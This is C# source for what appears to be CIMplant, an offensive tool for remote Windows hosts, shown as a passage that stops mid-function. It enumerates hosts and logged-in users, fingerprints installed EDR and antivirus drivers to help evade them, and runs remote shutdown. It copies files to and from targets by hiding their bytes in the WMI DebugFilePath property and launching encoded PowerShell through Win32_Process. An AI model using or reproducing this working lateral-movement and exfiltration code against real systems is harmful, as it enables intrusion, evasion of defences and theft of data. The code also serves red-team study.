using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Remoting;
using System.Management.Automation.Runspaces;
using System.Net;
using System.Reflection;
using System.Security;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Microsoft.Management.Infrastructure;
using Microsoft.Management.Infrastructure.Options;

namespace CIMplant
{
    public class ExecuteCim
    {
        public static string Namespace = @"root\cimv2";

        public object basic_info(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;
            const string osQuery = "SELECT * FROM Win32_OperatingSystem";
            IEnumerable<CimInstance> queryInstance = cimSession.QueryInstances(Namespace, "WQL", osQuery);

            foreach (CimInstance cimObject in queryInstance)
            {
                // Display the remote computer information
                Console.WriteLine("{0,-20}: {1,-10}", "Computer Name", cimObject.CimInstanceProperties["csname"].Value);
                Console.WriteLine("{0,-20}: {1,-10}", "Windows Directory", cimObject.CimInstanceProperties["WindowsDirectory"].Value);
                Console.WriteLine("{0,-20}: {1,-10}", "Operating System", cimObject.CimInstanceProperties["Caption"].Value);
                Console.WriteLine("{0,-20}: {1,-10}", "Version", cimObject.CimInstanceProperties["Version"].Value);
                Console.WriteLine("{0,-20}: {1,-10}", "Manufacturer", cimObject.CimInstanceProperties["Manufacturer"].Value);
                Console.WriteLine("{0,-20}: {1,-10}", "Number of Users", cimObject.CimInstanceProperties["NumberOfUsers"].Value);
                Console.WriteLine("{0,-20}: {1,-10}", "Registered User", cimObject.CimInstanceProperties["RegisteredUser"].Value);
            }
            return queryInstance;
        }

        public object active_users(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;
            List<string> users = new List<string>();

            const string osQuery = "SELECT LogonId FROM Win32_LogonSession Where LogonType=2";
            IEnumerable<CimInstance> queryInstance = cimSession.QueryInstances(Namespace, "WQL", osQuery);

            foreach (CimInstance cimObject in queryInstance)
            {

                var lQuery = "Associators of {Win32_LogonSession.LogonId=" + cimObject.CimInstanceProperties["LogonId"].Value + "} Where AssocClass=Win32_LoggedOnUser Role=Dependent";
                IEnumerable<CimInstance> subQuery = cimSession.QueryInstances(Namespace, "WQL", lQuery);

                foreach (CimInstance lCimObject in subQuery)
                {
                    //Grab the username and domain associated
                    users.Add(lCimObject.CimInstanceProperties["Domain"].Value + "\\" + lCimObject.CimInstanceProperties["Name"].Value);
                }
            }

            Console.WriteLine("{0,-15}", "Active Users");
            Console.WriteLine("{0,-15}", "------------");
            List<string> distinctUsers = users.Distinct().ToList();
            foreach (string user in distinctUsers)
                Console.WriteLine("{0,-25}", user);

            return queryInstance;
        }

        public object drive_list(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;

            var osQuery = "SELECT * FROM Win32_LogicalDisk WHERE DriveType = 3 OR DriveType = 4 OR DriveType = 2";
            IEnumerable<CimInstance> queryInstance = cimSession.QueryInstances(Namespace, "WQL", osQuery);

            Console.WriteLine("{0,-15}", "Drive List");
            Console.WriteLine("{0,-15}", "----------");

            foreach (CimInstance cimObject in queryInstance)
                Console.WriteLine("{0,-15}", cimObject.CimInstanceProperties["DeviceID"].Value);

            return queryInstance;
        }

        public object ifconfig(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;

            //This could probably use some work to look better
            const string osQuery = "SELECT * FROM Win32_NetworkAdapterConfiguration";
            IEnumerable<CimInstance> queryInstance = cimSession.QueryInstances(Namespace, "WQL", osQuery);

            foreach (CimInstance cimObject in queryInstance)
            {
                if (!IsNullOrEmpty((string[])cimObject.CimInstanceProperties["IPAddress"].Value))
                {
                    string[] defaultGateway = (string[])(cimObject.CimInstanceProperties["DefaultIPGateway"].Value);
                    try
                    {
                        Console.WriteLine("{0,-20}: {1,-10}", "DHCP Enabled", cimObject.CimInstanceProperties["DHCPEnabled"].Value);
                        Console.WriteLine("{0,-20}: {1,-10}", "DNS Domain", cimObject.CimInstanceProperties["DNSDomain"].Value);
                        Console.WriteLine("{0,-20}: {1,-10}", "Service Name", cimObject.CimInstanceProperties["ServiceName"].Value);
                        Console.WriteLine("{0,-20}: {1,-10}", "Description", cimObject.CimInstanceProperties["Description"].Value);
                        Console.WriteLine("{0,-20}: {1,-10}", "Default Gateway", defaultGateway[0]);
                    }
                    catch
                    {
                        //pass
                    }

                    foreach (string i in (string[])cimObject.CimInstanceProperties["IPAddress"].Value)
                    {
                        if (IPAddress.TryParse(i, out IPAddress address))
                        {
                            switch (address.AddressFamily)
                            {
                                case System.Net.Sockets.AddressFamily.InterNetwork:
                                    Console.WriteLine("{0,-20}: {1,-10}", "IP Address", address);
                                    break;
                            }
                        }
                    }
                }
            }
            return queryInstance;
        }

        public object installed_programs(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;

            const string osQuery = "SELECT * FROM  Win32_Product";
            IEnumerable<CimInstance> queryInstance = cimSession.QueryInstances(Namespace, "WQL", osQuery);

            Console.WriteLine("{0,-45}{1,-30}{2,20}{3,30}", "Application", "InstallDate", "Version", "Vendor");
            Console.WriteLine("{0,-45}{1,-30}{2,20}{3,30}", "-----------", "-----------", "-------", "------");

            foreach (CimInstance product in queryInstance)
            {
                string name = "";
                //Console.WriteLine(product);
                if (product.CimInstanceProperties["Name"].ToString() != null)
                {
                    try
                    {
                        name = product.CimInstanceProperties["Name"].Value.ToString();
                    }
                    catch
                    {
                        //pass
                    }

                    if (name.Length > 35)
                    {
                        name = Truncate(name, 35) + "...";
                    }

                    try
                    {
                        Console.WriteLine("{0,-45}{1,-30}{2,20}{3,30}", name,
                            DateTime.ParseExact(product.CimInstanceProperties["InstallDate"].Value.ToString(),
                                "yyyyMMdd", null), product.CimInstanceProperties["Version"].Value,
                            product.CimInstanceProperties["Vendor"].Value);
                    }
                    catch
                    {
                        //value probably doesn't exist, so just pass
                    }
                }
            }

            return queryInstance;
        }

        public object Win32Shutdown(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;
            string command = planter.Commander.Command;

            // This handles logoff, reboot/restart, and shutdown/poweroff
            const string osQuery = "SELECT * FROM Win32_OperatingSystem";
            IEnumerable<CimInstance> queryInstance = cimSession.QueryInstances(Namespace, "WQL", osQuery);

            CimMethodParametersCollection cimParams = new CimMethodParametersCollection();

            switch (command)
            {
                case "logoff":
                case "logout":
                    cimParams.Add(CimMethodParameter.Create("Flags", 4, CimFlags.In));
                    break;
                case "reboot":
                case "restart":
                    cimParams.Add(CimMethodParameter.Create("Flags", 6, CimFlags.In));
                    break;
                case "power_off":
                case "shutdown":
                    cimParams.Add(CimMethodParameter.Create("Flags", 5, CimFlags.In));
                    break;
            }

            // There's only one instance, so just grab the first one
            CimMethodResult nameResults = cimSession.InvokeMethod(queryInstance.First(), "Win32Shutdown", cimParams);

            if (Convert.ToUInt32(nameResults.ReturnValue.Value) == 0)
                return true;
            return null;
        }

        public object vacant_system(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;
            string system = planter.System;

            List<string> allProcs = new List<string>();
            const string osQuery = "SELECT * FROM Win32_Process";
            IEnumerable<CimInstance> queryInstance = cimSession.QueryInstances(Namespace, "WQL", osQuery);

            foreach (CimInstance cimObject in queryInstance)
            {
                allProcs.Add(cimObject.CimInstanceProperties["Caption"].Value.ToString());
            }

            // If screen saver or logon screen on
            if (allProcs.FirstOrDefault(s => s.Contains(".scr")) != null |
                allProcs.FirstOrDefault(s => s.Contains("LogonUI.exe")) != null)
            {
                Console.WriteLine("Screensaver or Logon screen is active on " + system);
            }

            else
            {
                // Get active users on the system
                List<string> users = new List<string>();
                const string newQuery = "SELECT LogonId FROM Win32_LogonSession Where LogonType=2";
                IEnumerable<CimInstance> activeQueryInstance = cimSession.QueryInstances(Namespace, "WQL", newQuery);

                foreach (CimInstance cimObject in activeQueryInstance)
                {
                    string lQuery = "Associators of {Win32_LogonSession.LogonId=" +
                                    cimObject.CimInstanceProperties["LogonId"].Value +
                                    "} Where AssocClass=Win32_LoggedOnUser Role=Dependent";
                    
                    IEnumerable<CimInstance> activeSubQueryInstance = cimSession.QueryInstances(Namespace, "WQL", lQuery);
                    
                    foreach (CimInstance subCimObject in activeSubQueryInstance)
                    {
                        users.Add(subCimObject.CimInstanceProperties["Name"].Value.ToString());
                    }
                }

                Messenger.WarningMessage("[-] System not vacant\n");
                Console.WriteLine("{0,-15}", "Active Users on " + system);
                Console.WriteLine("{0,-15}", "--------------------------------");

                List<string> distinctUsers = users.Distinct().ToList();
                foreach (string user in distinctUsers)
                    Console.WriteLine("{0,-15}", user);
            }

            return queryInstance;
        }

        // Idea and some code thanks to Harley - https://github.com/harleyQu1nn/AggressorScripts/blob/master/EDR.cna
        public object edr_query(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;
            bool activeEdr = false;

            string fileQuery = @"SELECT * FROM CIM_DataFile WHERE Path = '\\windows\\System32\\drivers\\'";
            IEnumerable<CimInstance> queryInstance = cimSession.QueryInstances(Namespace, "WQL", fileQuery);

            foreach (CimInstance cimObject in queryInstance)
            {
                string fileName = Path.GetFileName(cimObject.CimInstanceProperties["Name"].Value.ToString());

                switch (fileName)
                {
                    case "FeKern.sys":
                    case "WFP_MRT.sys":
                        Messenger.ErrorMessage("FireEye Found!");
                        activeEdr = true;
                        break;

                    case "eaw.sys":
                        Messenger.ErrorMessage("Raytheon Cyber Solutions Found!");
                        activeEdr = true;
                        break;

                    case "rvsavd.sys":
                        Messenger.ErrorMessage("CJSC Returnil Software Found!");
                        activeEdr = true;
                        break;

                    case "dgdmk.sys":
                        Messenger.ErrorMessage("Verdasys Inc. Found!");
                        activeEdr = true;
                        break;

                    case "atrsdfw.sys":
                        Messenger.ErrorMessage("Altiris (Symantec) Found!");
                        activeEdr = true;
                        break;

                    case "mbamwatchdog.sys":
                        Messenger.ErrorMessage("Malwarebytes Found!");
                        activeEdr = true;
                        break;

                    case "edevmon.sys":
                    case "ehdrv.sys":
                        Messenger.ErrorMessage("ESET Found!");
                        activeEdr = true;
                        break;

                    case "SentinelMonitor.sys":
                        Messenger.ErrorMessage("SentinelOne Found!");
                        activeEdr = true;
                        break;

                    case "edrsensor.sys":
                    case "hbflt.sys":
                    case "bdsvm.sys":
                    case "gzflt.sys":
                    case "bddevflt.sys":
                    case "AVCKF.SYS":
                    case "Atc.sys":
                    case "AVC3.SYS":
                    case "TRUFOS.SYS":
                    case "BDSandBox.sys":
                        Messenger.ErrorMessage("BitDefender Found!");
                        activeEdr = true;
                        break;

                    case "HexisFSMonitor.sys":
                        Messenger.ErrorMessage("Hexis Cyber Solutions Found!");
                        activeEdr = true;
                        break;

                    case "CyOptics.sys":
                    case "CyProtectDrv32.sys":
                    case "CyProtectDrv64.sys":
                        Messenger.ErrorMessage("Cylance Inc. Found!");
                        activeEdr = true;
                        break;

                    case "aswSP.sys":
                        Messenger.ErrorMessage("Avast Found!");
                        activeEdr = true;
                        break;

                    case "mfeaskm.sys":
                    case "mfencfilter.sys":
                    case "epdrv.sys":
                    case "mfencoas.sys":
                    case "mfehidk.sys":
                    case "swin.sys":
                    case "hdlpflt.sys":
                    case "mfprom.sys":
                    case "MfeEEFF.sys":
                        Messenger.ErrorMessage("McAfee Found!");
                        activeEdr = true;
                        break;

                    case "groundling32.sys":
                    case "groundling64.sys":
                        Messenger.ErrorMessage("Dell Secureworks Found!");
                        activeEdr = true;
                        break;

                    case "avgtpx86.sys":
                    case "avgtpx64.sys":
                        Messenger.ErrorMessage("AVG Technologies Found!");
                        activeEdr = true;
                        break;

                    case "pgpwdefs.sys":
                    case "GEProtection.sys":
                    case "diflt.sys":
                    case "sysMon.sys":
                    case "ssrfsf.sys":
                    case "emxdrv2.sys":
                    case "reghook.sys":
                    case "spbbcdrv.sys":
                    case "bhdrvx86.sys":
                    case "bhdrvx64.sys":
                    case "SISIPSFileFilter.sys":
                    case "symevent.sys":
                    case "vxfsrep.sys":
                    case "VirtFile.sys":
                    case "SymAFR.sys":
                    case "symefasi.sys":
                    case "symefa.sys":
                    case "symefa64.sys":
                    case "SymHsm.sys":
                    case "evmf.sys":
                    case "GEFCMP.sys":
                    case "VFSEnc.sys":
                    case "pgpfs.sys":
                    case "fencry.sys":
                    case "symrg.sys":
                        Messenger.ErrorMessage("Symantec Found!");
                        activeEdr = true;
                        break;

                    case "SAFE-Agent.sys":
                        Messenger.ErrorMessage("SAFE-Cyberdefense Found!");
                        activeEdr = true;
                        break;

                    case "CybKernelTracker.sys":
                        Messenger.ErrorMessage("CyberArk Software Found!");
                        activeEdr = true;
                        break;

                    case "klifks.sys":
                    case "klifaa.sys":
                    case "Klifsm.sys":
                        Messenger.ErrorMessage("Kaspersky Found!");
                        activeEdr = true;
                        break;

                    case "SAVOnAccess.sys":
                    case "savonaccess.sys":
                    case "sld.sys":
                        Messenger.ErrorMessage("Sophos Found!");
                        activeEdr = true;
                        break;

                    case "ssfmonm.sys":
                        Messenger.ErrorMessage("Webroot Software, Inc. Found!");
                        activeEdr = true;
                        break;

                    case "CarbonBlackK.sys":
                    case "carbonblackk.sys":
                    case "Parity.sys":
                    case "cbk7.sys":
                    case "cbstream.sys":
                        Messenger.ErrorMessage("Carbon Black Found!");
                        activeEdr = true;
                        break;

                    case "CRExecPrev.sys":
                        Messenger.ErrorMessage("Cybereason Found!");
                        activeEdr = true;
                        break;

                    case "im.sys":
                    case "CSAgent.sys":
                    case "CSBoot.sys":
                    case "CSDeviceControl.sys":
                    case "cspcm2.sys":
                        Messenger.ErrorMessage("CrowdStrike Found!");
                        activeEdr = true;
                        break;

                    case "cfrmd.sys":
                    case "cmdccav.sys":
                    case "cmdguard.sys":
                    case "CmdMnEfs.sys":
                    case "MyDLPMF.sys":
                        Messenger.ErrorMessage("Comodo Security Solutions Found!");
                        activeEdr = true;
                        break;

                    case "PSINPROC.SYS":
                    case "PSINFILE.SYS":
                    case "amfsm.sys":
                    case "amm8660.sys":
                    case "amm6460.sys":
                        Messenger.ErrorMessage("Panda Security Found!");
                        activeEdr = true;
                        break;

                    case "fsgk.sys":
                    case "fsatp.sys":
                    case "fshs.sys":
                        Messenger.ErrorMessage("F-Secure Found!");
                        activeEdr = true;
                        break;

                    case "esensor.sys":
                        Messenger.ErrorMessage("Endgame Found!");
                        activeEdr = true;
                        break;

                    case "csacentr.sys":
                    case "csaenh.sys":
                    case "csareg.sys":
                    case "csascr.sys":
                    case "csaav.sys":
                    case "csaam.sys":
                        Messenger.ErrorMessage("Cisco Found!");
                        activeEdr = true;
                        break;

                    case "TMUMS.sys":
                    case "hfileflt.sys":
                    case "TMUMH.sys":
                    case "AcDriver.sys":
                    case "SakFile.sys":
                    case "SakMFile.sys":
                    case "fileflt.sys":
                    case "TmEsFlt.sys":
                    case "tmevtmgr.sys":
                    case "TmFileEncDmk.sys":
                        Messenger.ErrorMessage("Trend Micro Inc Found!");
                        activeEdr = true;
                        break;

                    case "epregflt.sys":
                    case "medlpflt.sys":
                    case "dsfa.sys":
                    case "cposfw.sys":
                        Messenger.ErrorMessage("Check Point Software Technologies Found!");
                        activeEdr = true;
                        break;

                    case "psepfilter.sys":
                    case "cve.sys":
                        Messenger.ErrorMessage("Absolute Found!");
                        activeEdr = true;
                        break;

                    case "brfilter.sys":
                        Messenger.ErrorMessage("Bromium Found!");
                        activeEdr = true;
                        break;

                    case "LRAgentMF.sys":
                        Messenger.ErrorMessage("LogRhythm Found!");
                        activeEdr = true;
                        break;

                    case "libwamf.sys":
                        Messenger.ErrorMessage("OPSWAT Inc Found!");
                        activeEdr = true;
                        break;
                }
            }

            if (!activeEdr)
                Console.WriteLine("No EDR vendors found, tread carefully");

            return true;
        }


        ///////////////////////////////////////           FILE OPERATIONS            /////////////////////////////////////////////////////////////////////

        public object cat(Planter planter)
        {
            // Modified cat method from https://github.com/kyleavery/WMIEnum/blob/656666d00f6fd6fdfb67f398d83f27b6e28db7bf/WMIEnum/Program.cs#L186
            // Thanks to https://twitter.com/kyleavery_

            CimSession cimSession = planter.Connector.ConnectedCimSession;
            string path = planter.Commander.File;

            // Check for file first
            if (!CheckForFile(path, cimSession, verbose: false))
            {
                Console.WriteLine("Remote file does not exist, please specify a file present on the system");
                return null;
            }

            Messenger.GoodMessage("[+] Printing file: " + path);
            Messenger.GoodMessage("--------------------------------------------------------\n");

            // https://twitter.com/mattifestation/status/1220713684756049921
            CimInstance baseInstance = new CimInstance("PS_ModuleFile");
            baseInstance.CimInstanceProperties.Add(CimProperty.Create("InstanceID", path, CimFlags.Key));
            CimInstance modifiedInstance = cimSession.GetInstance("ROOT/Microsoft/Windows/Powershellv3", baseInstance);

            System.Byte[] fileBytes = (byte[])modifiedInstance.CimInstanceProperties["FileData"].Value;
            Console.WriteLine(Encoding.UTF8.GetString(fileBytes, 0, fileBytes.Length));
            return true;
        }

        public object copy(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;
            string startPath = planter.Commander.File;
            string endPath = planter.Commander.FileTo;

            if (!CheckForFile(startPath, cimSession, verbose:true))
            {
                //Make sure the file actually exists before doing any more work. I hate doing work with no goal
                return null;
            }
            if (CheckForFile(endPath, cimSession, verbose:false))
            {
                //Won't work if the resulting file exists
                Messenger.ErrorMessage("[-] Specified copy to file exists, please specify a file to copy to on the remote system that does not exist");
                return null;
            }

            Messenger.GoodMessage("[+] Copying file: " + startPath + " to " + endPath);
            string newPath = startPath.Replace("\\", "\\\\");
            string newEndPath = endPath.Replace("\\", "\\\\");

            string query = $"SELECT * FROM CIM_DataFile Where Name='{newPath}' ";
            IEnumerable<CimInstance> queryInstance = cimSession.QueryInstances(Namespace, "WQL", query);

            foreach (CimInstance cimObject in queryInstance)
            {
                // Set in-parameters for the method
                CimMethodParametersCollection cimParams = new CimMethodParametersCollection
                {
                    CimMethodParameter.Create("FileName", newEndPath, CimFlags.In)
                };

                // We only need the first (and only) instance
                cimSession.InvokeMethod(cimObject, "Copy", cimParams);
            }
            return queryInstance;
        }

        public object download(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;
            string downloadPath = planter.Commander.File;
            string writePath = planter.Commander.FileTo;

            if (!CheckForFile(downloadPath, cimSession, verbose: true))
            {
                //Messenger.ErrorMessage("[-] Specified file does not exist, not running PS runspace\n");
                return null;
            }

            if (!planter.Commander.NoPS)
            {
                string originalWmiProperty = GetOsRecovery(cimSession);
                bool wsman = true;
                bool resetEnvSize = false;
                string originalRemoteEnvSize = EnvelopeSize.GetMaxEnvelopeSize(cimSession);
                string originalLocalEnvSize = EnvelopeSize.GetLocalMaxEnvelopeSize();

                // Get the local maxEnvelopeSize. If it's not set (default) let's note that
                originalRemoteEnvSize = originalRemoteEnvSize == "0" ? "500" : originalRemoteEnvSize;
                originalLocalEnvSize = originalLocalEnvSize == "0" ? "500" : originalLocalEnvSize;

                Messenger.GoodMessage("[+] Downloading file: " + downloadPath + "\n");

                if (wsman == true)
                {
                    int fileSize = GetFileSize(downloadPath, cimSession);

                    // We can modify this later easily to pass wsman if needed
                    using (PowerShell powershell = PowerShell.Create())
                    {
                        try
                        {
                            powershell.Runspace = !string.IsNullOrEmpty(planter.Password?.ToString()) ? RunspaceCreate(planter) : RunspaceCreateLocal();

                            if (fileSize / 1024 > 450)
                            {
                                resetEnvSize = true;
                                Messenger.WarningMessage(
                                    "[*] Warning: The file size is greater than 450 KB, setting the maxEnvelopeSizeKB higher...");
                                int envSize = fileSize / 1024 > 250000 ? 999999999 : 256000;
                                EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
                                EnvelopeSize.SetMaxEnvelopeSize(envSize.ToString(), cimSession);
                            }

                            string command1 = "$data = Get-Content -Encoding byte -ReadCount 0 -Path '" + downloadPath +
                                              "'";
                            const string command2 = @"$encdata = [Int[]][byte[]]$data -Join ','";
                            const string command3 =
                                @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";

                            if (powershell.Runspace.ConnectionInfo != null)
                            {
                                powershell.Commands.AddScript(command1, false);
                                powershell.Commands.AddScript(command2, false);
                                powershell.Commands.AddScript(command3, false);
                                powershell.Invoke();


                            }
                            else
                                wsman = false;
                        }
                        catch (PSRemotingTransportException)
                        {
                            wsman = false;
                        }
                    }
                }

                if (wsman == false)
                {
                    // WSMAN not enabled on the remote system, use another method

                    // We need to check for the remote file size. If over 500KB (or 450 to be sure) let's raise the maxEnvelopeSizeKB
                    int fileSize = GetFileSize(downloadPath, cimSession);

                    if (fileSize / 1024 > 450)
                    {
                        resetEnvSize = true;
                        int envSize = fileSize / 1024 > 250000 ? 999999999 : 256000;
                        Messenger.WarningMessage(
                            "[*] Warning: The file size is greater than 450 KB, setting the maxEnvelopeSizeKB higher...");
                        if (fileSize / 1024 > 250000)
                        {
                            EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
                            EnvelopeSize.SetMaxEnvelopeSize("999999999",
                                cimSession); // This is the largest value we can set, so not sure if this will work
                        }
                        else
                        {
                            EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
                            EnvelopeSize.SetMaxEnvelopeSize("256000", cimSession);
                        }
                    }

                    // Create the parameters and create the new process. Broken out to make it easier to follow what's up
                    CimMethodParametersCollection cimParams = new CimMethodParametersCollection();

                    string encodedCommand = "$data = Get-Content -Encoding byte -ReadCount 0 -Path '" + downloadPath +
                                            "'; $encdata = [Int[]][byte[]]$data -Join ','; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
                    var encodedCommandB64 =
                        Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));
                    string fullCommand = "powershell -enc " + encodedCommandB64;

                    cimParams.Add(CimMethodParameter.Create("CommandLine", fullCommand, CimFlags.In));

                    // We only need the first instance
                    cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);
                }

                // Give it a second to write and check for changes to DebugFilePath
                Thread.Sleep(1000);
                Messenger.WarningMessage("\n[*] Checking for a modified DebugFilePath and grabbing the data. This may take a while if the file is large (USE WMI IF IT IS)\n");

                //string[] fileOutput = CheckForFinishedDebugFilePath(originalWMIProperty, cimSession).Split(',');
                string fileOutput = CheckForFinishedDebugFilePath(originalWmiProperty, cimSession);

                // We need to pause for a bit here for some reason
                Thread.Sleep(5000);

                //Create list for bytes
                List<byte> outputList = new List<byte>();

                //Convert from int (bytes) to byte
                foreach (string integer in fileOutput.Split(','))
                {
                    try
                    {
                        byte a = (byte)Convert.ToInt32(integer);
                        outputList.Add(a);
                    }
                    catch
                    {
                        //pass
                    }
                }

                //Save to local dir if no directory specified
                if (string.IsNullOrEmpty(writePath))
                    writePath = Path.GetFileName(downloadPath);

                File.WriteAllBytes(writePath, outputList.ToArray());

                SetOsRecovery(cimSession, originalWmiProperty);

                if (resetEnvSize)
                {
                    // Set the maxEnvelopeSizeKB back to the default val if we set it previously
                    EnvelopeSize.SetLocalMaxEnvelopeSize(Convert.ToInt32(originalLocalEnvSize));
                    EnvelopeSize.SetMaxEnvelopeSize(originalRemoteEnvSize, cimSession);
                }
            }
            else
            {
                Messenger.WarningMessage("Not running function to avoid any PowerShell usage, remove --nops or pick a new function");
            }

            return true;
        }

        public object ls(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;
            string path = planter.Commander.Directory;

            string drive = path.Substring(0, 2);
            Messenger.GoodMessage("[+] Listing directory: " + path + "\n");
            if (!path.EndsWith("\\"))
            {
                path += "\\";
            }

            string newPath = path.Remove(0, 2).Replace("\\", "\\\\");

            string fileQuery = $"SELECT * FROM CIM_DataFile Where Drive='{drive}' AND Path='{newPath}' ";
            IEnumerable<CimInstance> queryInstance = cimSession.QueryInstances(Namespace, "WQL", fileQuery);

            string folderQuery = $"SELECT * FROM Win32_Directory Where Drive='{drive}' AND Path='{newPath}' ";
            IEnumerable<CimInstance> folderInstance = cimSession.QueryInstances(Namespace, "WQL", folderQuery);

            Console.WriteLine("{0,-30}", "Files");
            Console.WriteLine("{0,-30}", "-----------------");
            foreach (CimInstance cimObject in queryInstance)
            {
                // Write all files to screen

                Console.WriteLine("{0}", Path.GetFileName(cimObject.CimInstanceProperties["Name"].Value.ToString()));
            }

            Console.WriteLine("\n{0,-30}", "Folders");
            Console.WriteLine("{0,-30}", "-----------------");

            foreach (CimInstance cimObject in folderInstance)
            {
                // Write all folders to screen
                Console.WriteLine("{0}", Path.GetFileName(cimObject.CimInstanceProperties["Name"].Value.ToString()));
            }

            return folderInstance;
        }

        public object search(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;
            string path = planter.Commander.Directory;
            string file = planter.Commander.File;

            ///////// Will probably have to add more tests in here in case the user decides to do some funny business ///////////
            string drive = path.Substring(0, 2);
            string fileName;

            Messenger.GoodMessage($"[+] Searching for file like '{file}' within directory {path} \n");
            if (!path.EndsWith("\\"))
            {
                path += "\\";
            }
            string newPath = path.Remove(0, 2).Replace("\\", "\\\\");

            //Build it vs sending in ObjectQuery so we can modify it accordingly (add extension qualifier and whatnot)
            string queryString = $"SELECT * FROM CIM_DataFile WHERE Drive='{drive}'";

            //Check to see if the user want's to search the whole drive (will be slowww)
            if (newPath == "\\\\")
            {
                //do nothing
            }
            else
                queryString += $" AND Path='{newPath}'";

            //Parse the file so we can modify the search accordingly
            if (!string.IsNullOrEmpty(Path.GetExtension(file)))
            {
                string extension = Path.GetExtension(file);
                extension = extension.Remove(0, 1); //remove the dot from the extension
                fileName = Path.GetFileNameWithoutExtension(file);
                queryString += $" AND Extension='{extension}'";
            }
            else
                fileName = file;

            //Parse for * sent in filename
            if (fileName.Contains("*"))
                fileName = fileName.Replace("*", "%");

            if (!string.IsNullOrEmpty(fileName))
                queryString += $" AND FileName LIKE '{fileName}'";

            IEnumerable<CimInstance> queryInstance = cimSession.QueryInstances(Namespace, "WQL", queryString);

            foreach (CimInstance cimObject in queryInstance)
            {
                // Write all files to screen
                Console.WriteLine("{0}", Path.GetFileName(cimObject.CimInstanceProperties["Name"].Value.ToString()));
            }

            return queryInstance;
        }

        public object upload(Planter planter)
        {
            CimSession cimSession = planter.Connector.ConnectedCimSession;
            string writePath = planter.Commander.FileTo;
            string uploadFile = planter.Commander.File;

            if (!File.Exists(uploadFile))
            {
                Messenger.ErrorMessage("[-] Specified local file does not exist, not running PS runspace\n");
                return null;
            }

            if (!planter.Commander.NoPS)
            {
                string originalWmiProperty = GetOsRecovery(cimSession);
                bool wsman = true;
                bool resetEnvSize = false;
                int envSize = 500;

                Messenger.GoodMessage("[+] Uploading file: " + uploadFile + " to " + writePath);
                Messenger.GoodMessage("--------------------------------------------------------------------\n");

                // We need to check for the remote file size. If over 500KB (or 450 to be sure) let's raise the maxEnvelopeSizeKB
                int fileSize = (int)new FileInfo(uploadFile).Length; //Value in KB

                if (fileSize / 1024 > 450)
                {
                    resetEnvSize = true;
                    envSize = fileSize / 1024 > 250000 ? 999999999 : 256000;
                    Messenger.WarningMessage(
                        "[*] Warning: The file size is greater than 450 KB, setting the maxEnvelopeSizeKB higher...");
                    if (fileSize / 1024 > 250000)
                    {
                        EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
                        EnvelopeSize.SetMaxEnvelopeSize("999999999",
                            cimSession); // This is the largest value we can set, so not sure if this will work
                    }
                    else
                    {
                        EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
                        EnvelopeSize.SetMaxEnvelopeSize("256000", cimSession);
                    }
                }

                List<int> intList = new List<int>();
                byte[] uploadFileBytes = File.ReadAllBytes(uploadFile);

                //Convert from byte to int (bytes)
                foreach (byte uploadByte in uploadFileBytes)
                {
                    int a = uploadByte;
                    intList.Add(a);
                }

                SetOsRecovery(cimSession, string.Join(",", intList));

                // Give it a second to write and check for changes to DebugFilePath
                Messenger.WarningMessage(
                    "\n[*] Checking for a modified DebugFilePath and grabbing the data. This may take a while if the file is large (USE WMI IF IT IS)\n");
                System.Threading.Thread.Sleep(1000);
                CheckForFinishedDebugFilePath(originalWmiProperty, cimSession);

                if (wsman == true)
                {
                    // We can modify this later easily to pass wsman if needed
                    using (PowerShell powershell = PowerShell.Create())
                    {
                        try
                        {
                            if (!string.IsNullOrEmpty(planter.Password?.ToString()))
                                powershell.Runspace = RunspaceCreate(planter);
                            else
                                powershell.Runspace = RunspaceCreateLocal();

                            const string command1 =
                                @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $encdata = $a.DebugFilePath";
                            const string command2 = @"$decode = [byte[]][int[]]$encdata.Split(',') -Join ' '";
                            string command3 =
                                @"[byte[]] $decoded = $decode -split ' '; Set-Content -Encoding byte -Force -Path '" +
                                writePath + "' -Value $decoded";

                            if (powershell.Runspace.ConnectionInfo != null)
                            {
                                powershell.Commands.AddScript(command1, false);
                                powershell.Commands.AddScript(command2, false);
                                powershell.Commands.AddScript(command3, false);
                                powershell.Invoke();
                            }
                            else
                                wsman = false;
                        }
                        catch (PSRemotingTransportException)
                        {
                            wsman = false;
                        }
                    }
                }

                if (wsman == false)
                {
                    // WSMAN not enabled on the remote system, use another method

                    // Create the parameters and create the new process. Broken out to make it easier to follow what's up
                    CimMethodParametersCollection cimParams = new CimMethodParametersCollection();

                    string encodedCommand =
                        "$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $encdata = $a.DebugFilePath; $decode = [byte[]][int[]]$encdata.Split(',') -Join ' '; [byte[]] $decoded = $decode -split ' '; Set-Content -Encoding byte -Force -Path '" +
                        writePath + "' -Value $decoded";
                    var encodedCommandB64 =
                        Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));
                    string fullCommand = "powershell -enc " + encodedCommandB64;

